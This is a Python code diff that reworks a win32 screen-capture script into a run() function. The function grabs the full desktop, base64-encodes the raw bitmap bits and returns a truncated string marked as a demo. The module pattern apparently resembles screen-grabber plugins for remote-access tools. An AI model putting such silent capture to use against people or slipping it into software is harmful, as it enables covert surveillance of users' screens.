@@ -2,26 +2,35 @@ import win32gui
 import win32ui
 import win32con
 import win32api
+import base64
+from io import BytesIO
 
-hdesktop = win32gui.GetDesktopWindow()
+def run():
+    hdesktop = win32gui.GetDesktopWindow()
 
-width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
-height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
-left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
-top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
+    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
+    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
+    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
 
-desktop_dc = win32gui.GetWindowDC(hdesktop)
-img_dc = win32ui.CreateDCFromHandle(desktop_dc)
-mem_dc = img_dc.CreateCompatibleDC()
+    desktop_dc = win32gui.GetWindowDC(hdesktop)
+    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
+    mem_dc = img_dc.CreateCompatibleDC()
 
-screenshot = win32ui.CreateBitmap()
-screenshot.CreateCompatibleBitmap(img_dc, width, height)
-mem_dc.SelectObject(screenshot)
+    screenshot = win32ui.CreateBitmap()
+    screenshot.CreateCompatibleBitmap(img_dc, width, height)
+    mem_dc.SelectObject(screenshot)
 
-mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
+    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
 
-screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')
+    buffer = BytesIO()
+    bmpinfo = screenshot.GetInfo()
+    bmpstr = screenshot.GetBitmapBits(True)
+    buffer.write(bmpstr)
 
-mem_dc.DeleteDC()
-win32gui.DeleteObject(screenshot.GetHandle())
+    mem_dc.DeleteDC()
+    win32gui.DeleteObject(screenshot.GetHandle())
+
+    encoded = base64.b64encode(buffer.getvalue()).decode()
+    return f"[SCREENSHOT base64] {encoded[:100]}..."  # Trả về 100 ký tự đầu để demo
 
